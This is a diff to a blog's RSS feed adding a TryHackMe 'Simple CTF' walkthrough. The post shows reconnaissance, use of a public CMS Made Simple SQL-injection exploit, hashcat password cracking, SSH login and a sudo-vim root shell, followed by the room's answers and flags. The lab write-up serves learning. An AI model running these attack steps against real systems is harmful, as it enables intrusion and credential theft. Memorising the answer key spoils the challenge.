@@ -6,8 +6,194 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 15 Apr 2023 10:41:56 -0500</lastBuildDate>
+        <lastBuildDate>Mon, 17 Apr 2023 15:34:29 -0500</lastBuildDate>
         <atom:link href="https://jb-williams.github.io/jbtech.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM_SimpleCTF_Walkthrough</title>
+            <link>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_simplectf_walkthrough/</link>
+            <pubDate>Mon, 17 Apr 2023 15:34:29 -0500</pubDate>
+            
+            <guid>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_simplectf_walkthrough/</guid>
+            <description>SimpleCTF TryHackMe performed by: jb-williams Simple CTF Deploy the machine and attempt the questions! Initial Scan First we run nmap on the target IP. The first scan didn&amp;rsquo;t give me any info and even suggested adding -Pn to the command: nmap -v -T4 -sV -sC -Pn -oA nmap/initial 10.10.237.242 This output will provide the answers for the first two questions. In the nmap output I noticed that the ftp service on port 21 allowed anonymous login.</description>
+            <content type="html"><![CDATA[<h1 id="simplectf-tryhackme">SimpleCTF TryHackMe</h1>
+<h2 id="performed-by-jb-williams">performed by: jb-williams</h2>
+<h1 id="heading"></h1>
+<h2 id="simple-ctf">Simple CTF</h2>
+<h4 id="deploy-the-machine-and-attempt-the-questions"><strong>Deploy the machine and attempt the questions!</strong></h4>
+<h1 id="heading-1"></h1>
+<h4 id="initial-scan"><strong>Initial Scan</strong></h4>
+<ul>
+<li>First we run <code>nmap</code> on the target IP.</li>
+<li>The first scan didn&rsquo;t give me any info and even suggested adding <code>-Pn</code> to the command:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -T4 -sV -sC -Pn -oA nmap/initial 10.10.237.242
+</span></span></code></pre></div><ul>
+<li>This output will provide the answers for the first two questions.</li>
+<li>In the <code>nmap</code> output I noticed that the <code>ftp</code> service on port 21 allowed anonymous login.</li>
+</ul>
+<h1 id="heading-2"></h1>
+<ul>
+<li>Login to FTP</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp -p 10.10.237.242
+</span></span></code></pre></div><ul>
+<li>And login as user <code>anonymous</code></li>
+<li>Then run <code>passive</code> to see if the output is:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Passive mode: off; fallback to active mode: off.
+</span></span></code></pre></div><ul>
+<li>Then running the command <code>ls</code> will show a directory called <code>pub</code>.</li>
+<li>Change into that directory with <code>cd pub</code> and run <code>ls</code> again.</li>
+<li>You will see a file called <code>ForMitch.txt</code>.</li>
+<li>To download all files in the directory including <code>ForMitch.txt</code> run the command <code>mget *</code>, and you can exit back out to your terminal.</li>
+<li>Viewing the contents of <code>ForMitch.txt</code> with <code>cat</code>, you see that the user Mitch has a very simple password that is easy to crack.</li>
+</ul>
+<h1 id="heading-3"></h1>
+<ul>
+<li>I ran <code>feroxbuster</code> on the target machine while if was going over the nmap output and ftp process.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -P http://localhost:8080 -e -u http://10.10.237.242/
+</span></span></code></pre></div><ul>
+<li>The main finds were paths <code>/simple/</code> and <code>/simple/admin/</code>.</li>
+<li>Traveling to the <code>/simple/</code> directory we see that the site is using a content management system <em>CMS Made Simple</em>.</li>
+<li>Scanning that page you can see on the bottom left that the version is <code>2.2.8</code></li>
+</ul>
+<h1 id="heading-4"></h1>
+<ul>
+<li>Using <code>searchsploit</code> we can see if there are any known exploits for this version.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit cms made simple 2.2.8
+</span></span></code></pre></div><ul>
+<li>The output shows that there is a known exploit <code>CMS Made Simple &lt; 2.2.10 - SQL Injection</code> with the exploit path of <code>php/webapps/46635.py</code>.</li>
+<li>To get the full path and to look at the exploit run:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -x 46635.py
+</span></span></code></pre></div><ul>
+<li>Noticed that it can be ran with <code>-u</code> for url <code>-w</code> for path/to wordlist and <code>--crack</code> to crack the password. So exited the pager.</li>
+<li>After leaving the pager it will show the full path to that exploit.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
+</span></span></code></pre></div><ul>
+<li>I copied that exploit to my working directory and ran it:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 46635.py -u http://10.10.237.242/simple --crack -w ~/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+</span></span></code></pre></div><ul>
+<li>Got an error and opened it up in a text editor.</li>
+<li>I noticed that the script started with <code>#!/usr/bin/env python</code> I changed it to <code>#!/usr/bin/env python3</code>.</li>
+<li>I also noticed that all the <code>print</code> statements were in <code>python2</code> syntax not <code>python3</code>. And need to change any of the <code>print &quot;&lt;Stuff&gt;&quot;</code> to <code>print (&quot;&lt;Stuff&gt;&quot;)</code>.</li>
+<li>To do this quickly all at once I closed the text editor and ran this command on <code>46635.py</code>.</li>
+</ul>
+<p><em>note: this didn&rsquo;t fully work&hellip; one edit needed to be made..shown below</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;s#&#34;.&#34;#(&amp;)#g&#39;</span> 46635.py
+</span></span></code></pre></div><ul>
+<li>Thought I was being clever but it actually double parentheses a print statement for me on line <code>183</code>, so I changed that line from:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>print colored<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;&lt;Stuffs&gt;&#34;</span><span style="color:#f92672">))</span>
+</span></span></code></pre></div><p><strong>to</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>print <span style="color:#f92672">(</span>colored<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;Stuffs&gt;&#34;</span><span style="color:#f92672">))</span>
+</span></span></code></pre></div><ul>
+<li>With that done I re-ran:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 46635.py -u http://10.10.237.242/simple --crack -w ~/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+</span></span></code></pre></div><ul>
+<li>The <code>--crack</code> option didn&rsquo;t work but I did get output: salt for a password, a username, an email, and a hashed password.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Salt <span style="color:#66d9ef">for</span> password found: 1dac0d92e9fa6bb2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: mitch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: admin@admin.com
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+</span></span></code></pre></div><ul>
+<li>If you run the password hash through <code>hash-identifier</code>, it shows that the hash is likely <code>MD5</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hash-identifier 0c01f4468bd75d7a84c7eb73846e8d96
+</span></span></code></pre></div><ul>
+<li>We can use <code>hashcat</code> to crack this, put it in <code>passwordhash:salt</code> format.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -O -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">10</span> 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --show
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
+</span></span></code></pre></div><ul>
+<li>The <code>-O</code> is to enalbe optimized kernel</li>
+<li>The <code>-a 0</code> is the attack mode for <code>MD5</code></li>
+<li>The <code>-m 10</code> is for the setup of the hash and salt <code>passwordhash:salt</code></li>
+<li>After the hash and salt the last bit is the path/to the rockyou.txt wordlist.</li>
+</ul>
+<h1 id="heading-5"></h1>
+<ul>
+<li>Finding the password for mitch, we attempt to login through ssh port 2222</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh mitch@10.10.237.242 -p <span style="color:#ae81ff">2222</span>
+</span></span></code></pre></div><ul>
+<li>After logging in run <code>ls</code> you see <code>user.txt</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat user.txt
+</span></span></code></pre></div><ul>
+<li>Also, running <code>ls /home</code> lets you see if there are any other users&rsquo; home folders.</li>
+<li>After getting the user.txt flag I ran <code>sudo -l</code> to see if there was anyting I could run as sudo with this user, and you can see that they are allowed to use <code>vim</code> without a password.</li>
+<li>Navigating to <a href="!https://gtfobins.github.io/">GTFOBins</a> and search for <code>vim</code>, and you can see a couple commands for breaking out of restricted envirnments. I tried option <code>(a)</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim -c <span style="color:#e6db74">&#39;:!/bin/bash&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Running <code>whoami</code> you can see you are now <code>root</code>.</li>
+<li>Run a quick <code>ls /root</code> and see <code>root.txt</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /root/root.txt
+</span></span></code></pre></div><h2 id="answers"><em>Answers</em></h2>
+<h4 id="how-many-services-are-running-under-port-1000"><strong>How many services are running under port 1000?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>2</code></li>
+</ul>
+<h1 id="heading-6"></h1>
+<h4 id="what-is-running-on-the-hight-port"><strong>What is running on the hight port?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>ssh</code></li>
+</ul>
+<h1 id="heading-7"></h1>
+<h4 id="whats-the-cve-you-re-using-against-the-application"><strong>What&rsquo;s the CVE you-re using against the application?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>CVE-2019-9053</code> <em>(found in the comments of the exploit code)</em></li>
+</ul>
+<h1 id="heading-8"></h1>
+<h4 id="to-what-kind-of-vulnerability-is-the-application-vulnerable"><strong>To what kind of vulnerability is the application vulnerable?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>sqli</code></li>
+</ul>
+<h1 id="heading-9"></h1>
+<h4 id="whats-the-password"><strong>What&rsquo;s the password?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>secret</code></li>
+</ul>
+<h1 id="heading-10"></h1>
+<h4 id="where-can-you-login-with-the-details-obtained"><strong>Where can you login with the details obtained?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>ssh</code></li>
+</ul>
+<h1 id="heading-11"></h1>
+<h4 id="whats-the-user-flag"><strong>Whats the user flag?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>G00d j0b, keep up!</code></li>
+</ul>
+<h1 id="heading-12"></h1>
+<h4 id="is-there-any-other-user-in-the-home-directory-whats-its-name"><strong>Is there any other user in the home directory? What&rsquo;s its name?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>sunbath</code></li>
+</ul>
+<h1 id="heading-13"></h1>
+<h4 id="what-can-you-leverage-to-spawn-a-privileged-shell"><strong>What can you leverage to spawn a privileged shell?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>vim</code></li>
+</ul>
+<h1 id="heading-14"></h1>
+<h4 id="whats-the-root-flag"><strong>What&rsquo;s the root flag?</strong></h4>
+<ul>
+<li><strong>Answer</strong>: <code>W3ll d0n3. You made it!</code></li>
+</ul>
+<h1 id="heading-15"></h1>
+<h1 id="heading-16"></h1>
+<h1 id="heading-17"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>THM_RootMe_Walkthrough</title>
